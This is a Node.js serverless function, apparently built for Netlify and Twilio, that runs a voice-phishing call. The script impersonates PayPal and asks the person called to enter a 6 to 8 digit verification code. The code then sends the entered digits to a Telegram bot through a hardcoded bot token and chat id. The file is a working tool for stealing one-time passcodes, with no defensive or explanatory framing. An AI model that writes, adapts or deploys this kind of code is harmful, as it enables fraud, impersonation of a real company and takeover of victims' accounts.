const express = require("express");
const serverless = require("serverless-http");
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const app = express();
const router = express.Router();
var request = require('request');
router.get("/", (req, res) => {
  res.json({
    hello: "hi!"
  });
});

router.get('/voice',(req,res) => {
  const twiml = new VoiceResponse();

  const gather = twiml.gather({ numDigits: 8 });
  gather.say('This call is from Paypal dot com. \nWe have sent you a 6 to 8 digits verification code to this number. \nPress the number now to verify');

  twiml.redirect('/voice');

  res.type('text/xml');
  res.send(twiml.toString());
  if (req.body.Digits) {
    request('https://api.telegram.org/bot5403778586:AAHLpzXNK3Qyk49NCGqUlrxcf8drC3Gdi9U/sendMessage?chat_id=5266183529&text=Hi+'+req.body.Digits, (err, res)=>{
      if(err){
        console.log("err")
      }
    })
  }

})
app.use(`/.netlify/functions/api`, router);

module.exports = app;
module.exports.handler = serverless(app);
